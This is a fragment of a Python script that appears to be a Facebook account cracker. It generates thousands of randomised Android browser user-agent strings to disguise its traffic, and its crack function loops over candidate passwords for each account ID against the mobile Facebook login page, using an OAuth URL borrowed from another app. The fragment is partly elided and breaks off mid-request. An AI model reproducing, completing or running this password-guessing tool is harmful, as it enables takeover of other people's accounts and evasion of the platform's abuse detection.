...
for xr in range(10000):
    rr = random.randint
    rc = random.choice
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Redmi Note 11T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ...
    ugent4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Redmi Note {str(rr(3,12))}) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ...
    ugent6 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Nexus 7 Build/MOB30X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(110,116))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent7 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; moto g pure) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(110,116))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent8 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; DE2118) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(110,116))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent9 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(110,116))}.{str(rr(75,150))} Safari/537.36"
    ugent12 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(6,13))}.0.{str(rr(110,116))}.{str(rr(75,150))} Mobile Safari/537.36"
    ugent13 = f"Mozilla/5.0 (Linux; Android {str(rr(6,13))}; XIAOMI Redmi Note {str(rr(6,13))} Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(110,116))}.{str(rr(75,150))} Mobile Safari/537.36 AlohaBrowser/2.19.3"
    zaxy = random.choice([ugent1,ugent2,ugent3,ugent4,ugent5,ugent6,ugent7,ugent8,ugent9,ugent12,ugent13])
    ugen.append(zaxy)
def uaku():
	try:
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=546387748750105&kid_directed_site=0&app_id=546387748750105&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D546387748750105%26cbt%3D1694784126487%26e2e%3D%257B%2522init%2522%253A1694784126488%257D%26ies%3D1%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dc956034b-a69f-44cf-a6db-c13f4a12c9ce%26scope%3Dopenid%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522745b8edb-cc85-413a-b5e2-3c4d1789ab4a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25226r92gqvcm62qc657b5bk%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.co.brainly%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DdHlM8bi92M80xiGhW2xgST9KMPiUaGuXGH1mXOOLcfk%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D745b8edb-cc85-413a-b5e2-3c4d1789ab4a%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.co.brainly%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522745b8edb-cc85-413a-b5e2-3c4d1789ab4a%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25226r92gqvcm62qc657b5bk%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
